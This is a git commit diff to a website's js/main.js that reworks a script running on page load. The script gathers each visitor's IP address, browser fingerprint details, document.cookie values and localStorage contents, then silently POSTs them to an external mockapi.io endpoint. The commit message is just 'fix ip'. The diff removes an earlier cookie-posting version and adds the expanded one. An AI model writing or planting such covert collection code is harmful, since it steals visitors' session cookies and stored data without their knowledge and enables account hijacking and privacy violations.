9cc8483c49c573744e50001e75158169c1600288
commituser <thanhmanh18995@gmail.com>
2022-11-25 17:50:26 +0700

    fix ip

--- js/main.js
+++ js/main.js
@@ -65,51 +65,48 @@ if(! (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navi
 }
 
 $(document).ready(function() {
-  let info={
-
-    timeOpened:new Date(),
-    timezone:(new Date()).getTimezoneOffset()/60,
-
-    pageon(){return window.location.pathname},
-    referrer(){return document.referrer},
-    previousSites(){return history.length},
-
-    browserName(){return navigator.appName},
-    browserEngine(){return navigator.product},
-    browserVersion1a(){return navigator.appVersion},
-    browserVersion1b(){return navigator.userAgent},
-    browserLanguage(){return navigator.language},
-    browserOnline(){return navigator.onLine},
-    browserPlatform(){return navigator.platform},
-    javaEnabled(){return navigator.javaEnabled()},
-    dataCookiesEnabled(){return navigator.cookieEnabled},
-    dataCookies1(){return document.cookie},
-    dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
-    dataStorage(){return localStorage},
-
-    sizeScreenW(){return screen.width},
-    sizeScreenH(){return screen.height},
-    sizeDocW(){return document.width},
-    sizeDocH(){return document.height},
-    sizeInW(){return innerWidth},
-    sizeInH(){return innerHeight},
-    sizeAvailW(){return screen.availWidth},
-    sizeAvailH(){return screen.availHeight},
-    scrColorDepth(){return screen.colorDepth},
-    scrPixelDepth(){return screen.pixelDepth},
-
-
-    };
-
     $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+      let info={
+
+        timeOpened:new Date(),
+        timezone:(new Date()).getTimezoneOffset()/60,
+    
+        pageon(){return window.location.pathname},
+        referrer(){return document.referrer},
+        previousSites(){return history.length},
+    
+        browserName(){return navigator.appName},
+        browserEngine(){return navigator.product},
+        browserVersion1a(){return navigator.appVersion},
+        browserVersion1b(){return navigator.userAgent},
+        browserLanguage(){return navigator.language},
+        browserOnline(){return navigator.onLine},
+        browserPlatform(){return navigator.platform},
+        javaEnabled(){return navigator.javaEnabled()},
+        dataCookiesEnabled(){return navigator.cookieEnabled},
+        dataCookies1(){return document.cookie},
+        dataCookies2(){return decodeURIComponent(document.cookie.split(";"))},
+        dataStorage(){return localStorage},
+    
+        sizeScreenW(){return screen.width},
+        sizeScreenH(){return screen.height},
+        sizeDocW(){return document.width},
+        sizeDocH(){return document.height},
+        sizeInW(){return innerWidth},
+        sizeInH(){return innerHeight},
+        sizeAvailW(){return screen.availWidth},
+        sizeAvailH(){return screen.availHeight},
+        scrColorDepth(){return screen.colorDepth},
+        scrPixelDepth(){return screen.pixelDepth},
+      };
       $.ajax({
-          url: 'https://638040e38efcfcedac002c4a.mockapi.io/ap1/requests',
+          url: 'https://638040e38efcfcedac002c4a.mockapi.io/ap1/infos',
           type: 'POST',
           dataType: 'html',
           data: {
             join_at: new Date(),
-            ip: data,
-            content: document.cookie.split(';').reduce((ac, str) => Object.assign(ac, {[str.split('=')[0].trim()]: str.split('=')[1]}), {})
+            content: info,
+            ip: JSON.stringify(data),
           }
       }).done(function(result) {
       });
